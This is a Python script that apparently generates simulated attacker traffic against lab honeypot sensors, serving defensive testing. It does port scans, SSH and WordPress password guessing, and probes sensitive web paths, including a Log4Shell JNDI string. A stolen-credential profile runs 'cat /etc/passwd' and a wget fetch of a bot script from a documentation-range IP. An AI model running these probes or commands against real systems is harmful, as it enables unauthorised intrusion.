#!/usr/bin/env python3
"""One simulated Internet attacker (runs inside a container whose source IP is public).
usage: inet_attacker.py PROFILE FS_IP WEB_IP [DC_IP|-] [USER PASS]
profiles: scanner ssh web smb rdp dc mix leaked   (DC_IP "-" = the lab has no DC decoy)
Harmless fixed payloads only; talks only to the given ReD-Pot sensors (at most 3: FS, WEB, DC)."""
import random, socket, sys, urllib.request, urllib.parse

prof, fs, web = sys.argv[1], sys.argv[2], sys.argv[3]
dc = sys.argv[4] if len(sys.argv) > 4 and sys.argv[4] != "-" else None
leaked = sys.argv[5:7]  # optional user pass (stolen-credential demo)

def tcp(h, p):
    s = socket.socket(); s.settimeout(1.5)
    try: s.connect((h, p))
    except OSError: pass
    finally: s.close()

def scan():
    for h in (fs, web, dc):
        if not h:
            continue
        for p in (21, 22, 23, 80, 88, 389, 443, 445, 3389, 8080):
            tcp(h, p)

def ssh(users=("root", "admin", "ubuntu", "oracle", "pi", "test"), pw=("123456", "admin", "password", "root")):
    import paramiko
    for u in random.sample(users, k=min(len(users), random.randint(3, 6))):
        c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try: c.connect(web, 22, username=u, password=random.choice(pw), timeout=6, allow_agent=False, look_for_keys=False, banner_timeout=10)
        except Exception: pass
        finally: c.close()

def http():
    ua = random.choice(["Mozilla/5.0 zgrab/0.x", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
                        "Mozilla/5.0 (compatible; CensysInspect/1.1)", "python-requests/2.31.0", "Mozilla/5.0"])
    for path in random.sample(["/", "/.env", "/wp-login.php", "/.git/config", "/phpmyadmin/", "/admin/", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                               "/cgi-bin/luci/;stok=/locale", "/?q=${jndi:ldap://203.0.113.7/a}", "/boaform/admin/formLogin", "/actuator/health"], k=6):
        try: urllib.request.urlopen(urllib.request.Request(f"http://{web}{path}", headers={"User-Agent": ua}), timeout=5).read()
        except Exception: pass
    if random.random() < .6:
        data = urllib.parse.urlencode({"log": "admin", "pwd": random.choice(["admin", "123456", "wordpress"])}).encode()
        try: urllib.request.urlopen(urllib.request.Request(f"http://{web}/wp-login.php", data=data), timeout=5).read()
        except Exception: pass

def smb():
    from impacket.smbconnection import SMBConnection
    try:
        c = SMBConnection(fs, fs, timeout=5); c.login("", "")
        c.listShares(); c.logoff()
    except Exception: pass

def dc_probe():
    """Exposed DC: SMB null session + share list, then an RDP cookie (most common Internet noise on 445/3389)."""
    if not dc:
        return
    from impacket.smbconnection import SMBConnection
    try:
        c = SMBConnection(dc, dc, timeout=5); c.login("", "")
        c.listShares(); c.logoff()
    except Exception: pass
    rdp(dc)

def rdp(host=None):
    s = socket.create_connection((host or fs, 3389), 4)
    cookie = f"Cookie: mstshash={random.choice(['Administrator', 'admin', 'hello', 'test'])}\r\n".encode()
    neg = bytes([1, 0, 8, 0, 3, 0, 0, 0]); x = bytes([6 + len(cookie) + len(neg), 0xE0, 0, 0, 0, 0, 0]) + cookie + neg
    s.sendall(bytes([3, 0]) + (4 + len(x)).to_bytes(2, "big") + x); s.recv(64); s.close()

def leaked_login():
    import paramiko
    c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(web, 22, username=leaked[0], password=leaked[1], timeout=6, allow_agent=False, look_for_keys=False)
    for cmd in ("uname -a", "id", "cat /etc/passwd", "wget http://203.0.113.66/bot.sh"):
        c.exec_command(cmd)[1].read()
    c.close()

P = {"scanner": [scan], "ssh": [ssh], "web": [http], "smb": [scan, smb], "rdp": [rdp], "dc": [dc_probe],
     "mix": [scan, http, ssh], "leaked": [scan, leaked_login]}
for f in P[prof]:
    try: f()
    except Exception as e: print(prof, f.__name__, "err", e)
print("done", prof)
